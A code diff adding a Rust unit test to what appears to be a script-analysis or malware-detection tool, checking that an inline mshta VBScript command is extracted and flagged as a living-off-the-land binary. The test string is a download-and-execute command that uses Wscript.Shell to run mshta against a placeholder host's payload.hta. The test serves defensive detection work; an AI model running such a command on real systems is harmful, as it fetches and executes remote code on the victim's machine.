@@ -6414,6 +6414,28 @@ mod misc_handler_tests {
     }
 
     #[test]
+    fn mshta_inline_vbscript_payload_is_queued_and_lolbas() {
+        let raw = r#"mshta vbscript:CreateObject("Wscript.Shell").Run("mshta http://mshta-inline-vbs.example/payload.hta")"#;
+        let mut env = Environment::new(&Config::default());
+
+        interpret_line(raw, &mut env);
+
+        assert!(
+            env.all_extracted_vbs.iter().any(|payload| payload
+                == br#"CreateObject("Wscript.Shell").Run("mshta http://mshta-inline-vbs.example/payload.hta")"#),
+            "inline mshta VBScript payload was not queued: {:?}",
+            env.all_extracted_vbs
+        );
+        assert!(
+            env.traits
+                .iter()
+                .any(|t| matches!(t, Trait::Lolbas { name, cmd } if name == "mshta" && cmd == raw)),
+            "inline mshta VBScript payload not marked as LOLBAS: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn mshta_javascript_location_url_emits_download() {
         let mut env = Environment::new(&Config::default());
         interpret_line(
